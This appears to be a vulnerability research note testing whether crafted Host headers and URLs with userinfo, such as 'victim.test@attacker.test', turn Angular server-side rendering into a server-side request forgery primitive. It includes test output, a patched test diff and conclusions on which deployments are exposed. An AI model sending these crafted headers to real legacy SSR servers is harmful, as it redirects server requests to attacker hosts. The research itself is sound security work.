# Default SSR Expansion

Date: 2026-04-28

## Question

Does the `platform-server` origin pivot survive in default Angular SSR wiring, or only when an app
passes attacker-controlled URL material directly into `INITIAL_CONFIG.url` / `renderApplication()`?

## Current `@angular/ssr` Node engine path

Installed `@angular/ssr` code constructs the request URL before passing it into the app engine:

```js
return new URL(`${protocol}://${hostnameWithPort}${originalUrl ?? url}`);
```

It also validates Host-like headers before rendering:

```js
const VALID_HOST_REGEX = /^[a-z0-9_.-]+(:[0-9]+)?$/i;
...
if (headerValue && !VALID_HOST_REGEX.test(headerValue)) {
  throw new Error(`Header "${headerName}" contains characters that are not allowed.`);
}
```

Security consequence:

- `Host: victim.test@attacker.test` is rejected by current `@angular/ssr`.
- Absolute-form request targets such as `http:///attacker.test/p` are not passed directly as the
  render URL. They are appended after the validated host first.

## Request-target expansion through `createRequestUrl()` composition

Equivalent composition tested:

```js
new URL(`http://${host}${requestTarget}`)
```

Interesting cases:

```json
{"host":"victim.test:4000","target":"http:///attacker.test/p","result":"Invalid URL"}
{"host":"victim.test","target":"http:///attacker.test/p","origin":"http://victim.testhttp","pathname":"///attacker.test/p"}
{"host":"victim.test:4000","target":"//attacker.test/p","origin":"http://victim.test:4000","pathname":"//attacker.test/p"}
{"host":"victim.test","target":"//attacker.test/p","origin":"http://victim.test","pathname":"//attacker.test/p"}
```

Interpretation: the current `@angular/ssr` Node wrapper appears to block or neutralize the
`http:///attacker` request-target variant before it becomes attacker origin.

## Legacy / direct `platform-server` Express pattern

Angular's integration SSR server still contains the classic pattern:

```ts
const {protocol, originalUrl, baseUrl, headers} = req;

renderApplication(bootstrap, {
  document: indexHtml,
  url: `${protocol}://${headers.host}${originalUrl}`,
  platformProviders: [{provide: APP_BASE_HREF, useValue: baseUrl}],
})
```

Node and Express accept Host headers containing `@`:

```json
{"url":"/foo","host":"victim.test@attacker.test"}
{"sentHost":"victim.test@attacker.test","response":"HTTP/1.1 200 OK","parsed":{"origin":"http://attacker.test","username":"victim.test","hostname":"attacker.test"}}
{"url":"/foo","host":"victim.test:4321@attacker.test"}
{"sentHost":"victim.test:4321@attacker.test","response":"HTTP/1.1 200 OK","parsed":{"origin":"http://attacker.test","username":"victim.test","hostname":"attacker.test"}}
```

So a legacy/direct server that builds `url` from raw `headers.host` without validation can pass:

```text
http://victim.test@attacker.test/foo
```

or:

```text
http://victim.test:4321@attacker.test/foo
```

into `renderApplication()` / `renderModule()`.

## Angular server HttpClient rewrite confirmation

Temporary patch in Angular's existing server `HttpClient` test:

```diff
- url: 'http://localhost:4000/foo',
+ url: 'http://localhost:4000@attacker.com/foo',
```

Observed failure:

```text
Expected one matching request for criteria "Match URL: http://localhost:4000/testing", found none.
Requests received are: GET http://localhost:4000@attacker.com/testing.
```

Although the test backend compares the raw URL string, that string is a valid URL whose effective
origin is `http://attacker.com` because `localhost:4000` is parsed as userinfo.

## Conclusion

There are two different deployment classes:

1. Current `@angular/ssr` Node engine: appears protected by request URL reconstruction plus Host
   header validation. No default exploitable SSRF confirmed here.
2. Direct / legacy `@angular/platform-server` servers that pass raw `headers.host` or raw
   `INITIAL_CONFIG.url`: confirmed framework SSRF primitive. Relative server-side `HttpClient`
   requests are rewritten under the attacker-controlled origin.

The next confirmation should use a full legacy-style Express SSR app and a real attacker listener.
For current `@angular/ssr`, the current evidence points to `REFUTED` for the tested variants unless
another vector bypasses `VALID_HOST_REGEX` or `createRequestUrl()`.

